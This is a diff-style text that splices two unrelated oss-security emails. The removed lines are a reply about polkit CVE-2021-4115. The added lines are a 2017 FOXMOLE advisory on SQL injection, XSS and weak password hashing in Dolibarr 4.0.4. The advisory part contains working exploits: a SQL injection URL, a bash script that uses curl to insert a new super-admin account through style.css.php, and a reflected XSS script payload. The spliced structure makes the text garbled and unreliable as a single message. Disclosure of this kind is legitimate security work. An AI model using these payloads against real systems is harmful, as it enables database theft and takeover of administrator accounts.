+X-MS-Exchange-CrossTenant-OriginalArrivalTime: 10 May 2017 08:28:32.7232 (UTC)
 X-MS-Exchange-CrossTenant-FromEntityHeader: Hosted
-X-MS-Exchange-CrossTenant-Id: 4e2c6054-71cb-48f1-bd6c-3a9705aca71b
-X-MS-Exchange-CrossTenant-MailboxType: HOSTED
-X-MS-Exchange-CrossTenant-UserPrincipalName: wdo6XX+7dySGgkD7Xe8ogSa+7foIPdwRLP4L/ACVCNV80w51XscdX0XiK05iPshuQds11fZR4ysrPOk1e7NlKruDVeF1Ih7qLXGCT2ebEao=
-X-MS-Exchange-Transport-CrossTenantHeadersStamped: BN8PR10MB4098
-X-Proofpoint-Virus-Version: vendor=nai engine=6300 definitions=10262 signatures=677614
-X-Proofpoint-Spam-Details: rule=notspam policy=default score=0 bulkscore=0 phishscore=0 adultscore=0
- mlxlogscore=999 mlxscore=0 suspectscore=0 spamscore=0 malwarescore=0
- classifier=spam adjust=0 reason=mlx scancount=1 engine=8.12.0-2201110000
- definitions=main-2202180118
-X-Proofpoint-ORIG-GUID: KLXnCexoNFMzAcv07fB8W69AaYT1721J
-X-Proofpoint-GUID: KLXnCexoNFMzAcv07fB8W69AaYT1721J
-Subject: Re: [oss-security] CVE-2021-4115: polkit: file descriptor leak allows
- an unprivileged user to cause a crash.
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: HE1P193MB0057
+Subject: [oss-security] Dolibarr ERP & CRM - Multiple Issues
 
-On 2/17/22 13:35, Devon Thompson wrote:
-> Description:
-> There is an error handing flaw in polkit which can allow an unprivileged user to 
-> cause polkit to crash.
-> The crash happens due to process file descriptor exhaustion.
-> NOTE: Polkit process outage duration is tied to the failing process being reaped 
-> and a new one being spawned.
+--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC
+Content-Type: multipart/mixed; boundary="Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF";
+ protected-headers="v1"
+From: FOXMOLE Advisories <advisories@foxmole.com>
+To: oss-security@lists.openwall.com
+Message-ID: <24585059-6758-7cd1-f142-8c56a1a9ffb8@foxmole.com>
+Subject: Dolibarr ERP & CRM - Multiple Issues
 
-A more detailed description has been posted at
-https://securitylab.github.com/advisories/GHSL-2021-077-polkit/
+--Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF
+Content-Type: text/plain; charset=utf-8
+Content-Transfer-Encoding: quoted-printable
 
-> References:
-> https://access.redhat.com/security/cve/cve-2021-4115
-> https://bugzilla.redhat.com/show_bug.cgi?id=2054127
-> https://pkgs.devel.redhat.com/cgit/rpms/polkit/commit/?h=rhel-8.6.0&id=a71b0b5bb6624858a16bfbc1e721757b243709c6 
+=3D=3D=3D FOXMOLE - Security Advisory 2017-02-23 =3D=3D=3D
 
-That last hostname does not resolve (perhaps it's internal to Red Hat?).
+Dolibarr ERP & CRM  - Multiple Issues
+~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
-I'm surprised these are all Red Hat URL's - was this not reported & fixed
-upstream?  I see a query asking about that at
-https://gitlab.freedesktop.org/polkit/polkit/-/issues/170 but no response,
-and no commit or merge request yet there.
+Affected Versions
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Dolibarr 4.0.4
 
--- 
-         -Alan Coopersmith-                 alan.coopersmith@oracle.com
-          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
+Issue Overview
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+Vulnerability Type: SQL Injection, Cross Site Scripting,
+                    Weak Hash Algorithm without Salt, Weak Password Change =
+Method
+Technical Risk: critical
+Likelihood of Exploitation: medium
+Vendor: Dolibarr
+Vendor URL: https://www.dolibarr.org/
+Credits: FOXMOLE employees Tim Herres and Stefan Pietsch
+Advisory URL: https://www.foxmole.com/advisories/foxmole-2017-02-23.txt
+Advisory Status: Public
+OVE-ID: OVE-20170223-0001
+CVE Number: CVE-2017-7886, CVE-2017-7887, CVE-2017-7888
+CVE URL: https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7886
+         https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7887
+         https://www.cve.mitre.org/cgi-bin/cvename.cgi?name=3D2017-7888
+CWE-ID: CWE-79, CWE-89, CWE-327, CWE-620, CWE-759
+CVSS 2.0: 10.0 (AV:N/AC:L/Au:N/C:C/I:C/A:C)
+
+
+Impact
+=3D=3D=3D=3D=3D=3D
+There are SQL injection vulnerabilities, exploitable without authentication.
+An attacker could use the SQL Injection to access the database in an unsafe=
+ way.
+This means there is a high impact to all Dolibarr installations.
+The passwords in the database are stored as MD5 hashes which means they are=
+ easily crackable.
+The Dolibarr software also lacks input validation resulting in different re=
+flected XSS vulnerabilities.
+
+Information
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+We only provide examples for issues, there are quite more.
+It is really important to check the whole application for further vulnerabi=
+lities.
+We want that developers change the overall security according to security b=
+est
+practices instead of fixing only particular issues.
+
+Issue Description
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+
+All items tested using FF52.
+
+1.) SQL Injection in style.css.php (CVE-2017-7886)
+Authentication Required:No
+
+PoC:
+http://192.168.241.143/doli/theme/eldy/style.css.php?lang=3Dde%27%20procedu=
+re%20analyse(extractvalue(rand()%2cconcat(concat(0x3a,CURRENT_USER())))%2c1=
+)--%201
+
+
+PoC creating a new admin user via SQL Injection:
+
+###########################################################################=
+#######
+#!/bin/bash
+URL=3D"http://192.168.19.19/theme/eldy/style.css.php?lang=3Dde%27%3BINSERT%=
+20INTO%20\
+llx_user%20VALUES%20(424242%2C%200%2C%20NULL%2C%20NULL%2C%201%2C%200%2C%20%=
+27\
+1984-01-01%2000%3A00%3A00%27%2C%20%271984-01-01%2000%3A00%3A00.000%27%2C%20=
+NULL\
+%2C%20NULL%2C%20%27newadmin%27%2C%20NULL%2C%20%2761529519452809720693702583=
+126814\
+%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%20%27SuperAdmin%27%2C%20%2=
+7%27\
+%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%=
+27\
+%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%20%27%27%2C%201%2C%2=
+01%2C\
+%201%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20%27\
+2017-03-10%2000%3A00%3A00%27%2C%20%272017-03-10%2000%3A00%3A00%27%2C%20NULL=
+%2C\
+%20%27%27%2C%20NULL%2C%201%2C%20NULL%2C%20NULL%2C%20%27%27%2C%20NULL%2C%200=
+%2C\
+%20%27%27%2C%200%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL%2C%20NULL)%3B--%27"
+
+curl -s ${URL}
+###########################################################################=
+#######
+
+The script creates the user 'NEWADMIN' with password 'ximaz'.
+
+
+2.) Cross Site Scripting Reflected (CVE-2017-7887)
+http://192.168.241.143/doli/societe/list.php?sall=3Dasd%3Cscript%3Ealert(%2=
+2xss%22)%3C%2Fscript%3E
+
+3.) Passwords stored using MD5 hashes (CVE-2017-7888)
+The application stored the passwords using the MD5 hash algorithm without a
+salt. The MD5 hash is easily crackable.
+
+dolibarr=3D# SELECT login,pass_crypted FROM llx_user;
+ login |           pass_crypted
+-------+----------------------------------
+ admin | 21232f297a57a5a743894a0e4a801fc3
+
+4.) Unsafe password change method
+A user can change his password without entering the recent one.
+
+
+
+Temporary Workaround and Fix
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
+=3D=3D=3D
+FOXMOLE advises to restrict the access to all vulnerable Dolibarr systems u=
+ntil all vulnerabilities are fixed.
+
+
+
+History
+=3D=3D=3D=3D=3D=3D=3D
+2017-02-15  Issue discovered
+2017-03-06  Vendor contacted
+2017-03-27  informed Vendor about disclosure date (2017-05-10)
+2017-04-18  added CVE Numbers
+2017-05-10  Advisory Release
+
+
+GPG Signature
+=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
+This advisory is signed with the GPG key of the FOXMOLE advisories team.
+The key can be downloaded here: https://www.foxmole.com/advisories-key-3812=
+092199E3277C.asc
+
+
+
+--Xh1l5wE8l2NdM4mdURBVKopsRvUxnQFaF--
+
+--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC
+Content-Type: application/pgp-signature; name="signature.asc"
+Content-Description: OpenPGP digital signature
+Content-Disposition: attachment; filename="signature.asc"
+
+-----BEGIN PGP SIGNATURE-----
+
+iQIzBAEBCAAdFiEEjrQMZqTYqiY2IftqOBIJIZnjJ3wFAlkSzy0ACgkQOBIJIZnj
+J3y4SQ/5AakBh6LY4Iiv70tyuWiceNe2okNwHtsuxsdzBP4NavIhWrkPtcR29Gsb
+YZRwUHuj2RHFAafRRN47P/nuabfWH2gJki+H+iFsnw7shA2i+jX903GTyP2yFTZx
+6+LsEabdyUTOD5Ha9TNDOI6ubzVBZvFZMPhIfVGqHaY3StsgmvrmnjlKzI9AaevI
+N5RiP7fwPk6LIfuP2KrOsHOTalSalzgkf25WiNq6uqbtmNrUVrrKU/0Zd5I7+78c
+oh9g09Ka9i3bhkT6bKYmhRyb6xPQPFiKpsEw6MXDqy+RHtw2UZWtigS/yX1OmOLI
+XBaaeYNayjmKDVmevbcSgO4tK68XiWYx36nqCrFPAdhduAMX4LM0qMjaCs3GZs0B
+tagauSlOajEgrlCowEmoQDdjSOrTDdom2QK+8vp7c1cNAqzNDUwXSslOtKS6F3iD
+F1XvjqEVH9hSsEi0Y13cb3EFbCgqEzenA3AMiv4rrzCDV0/mKGkcthMK5oYL/2/f
+huzOfZIg2RAJ7jHAMkrgGjfvHOL4Ai4t31qBq1UvsEKgacJ59bn4yiE5MC/qfLyf
+Bf6TiRUqeJONWpLNPoUcTejsJ1jqcWpjj1ljyvfYK2tDDxTTN+G3Z22aMMrc/NdK
+2pIQuBgqF59c7EtT/CCb9+yQq8fDF8AgCrVBW7RnxGM2A1mZWJc=
+=SGB0
+-----END PGP SIGNATURE-----
+
+--uhLAO7tCGA6aW47bpMlvtw7rMRHH0oxSC--
